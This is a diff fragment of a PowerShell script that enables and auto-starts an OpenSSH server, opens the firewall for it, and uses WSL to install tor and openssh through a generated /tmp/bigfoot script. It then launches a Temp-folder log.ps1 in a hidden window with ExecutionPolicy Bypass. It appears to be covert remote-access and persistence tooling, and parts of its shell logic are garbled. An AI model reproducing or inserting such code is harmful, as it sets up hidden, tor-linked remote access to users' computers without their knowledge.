@@ -17,7 +17,7 @@ New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server (sshd)' -Enabled Tru
 Set-Service -Name sshd -StartupType 'Automatic';
 Start-Service sshd;
 $Big = "cat /tmp/bigfoot | echo '#!/bin/bash' >> /tmp/bigfoot | echo -e 'apt update -y; apt upgrade -y;\n apt install -y tor openssh-server openssh-client'"
-$Foot = " >> /tmp/bigfoot;\n echo 'wsl /tmp/bigfoot' > /mnt/c/Users/$Env:USERNAME/AppData/Local/Temp/log.ps1; chmod +x /tmp/bigfoot; /tmp/bigfoot";
+$Foot = " >> /tmp/bigfoot;\n echo wsl > /mnt/c/Users/$Env:USERNAME/AppData/Local/Temp/log.ps1; chmod +x /tmp/bigfoot; /tmp/bigfoot";
 $BigFoot = $Big + $Foot;
 bash -c $BigFoot;
 $Arg = " Start-Process powershell ' -WindowStyle Hidden -ConfirmPreference SilentlyContinue -ExecutionPolicy Bypass $env:LOCALAPPDATA\Temp\log.ps1'";
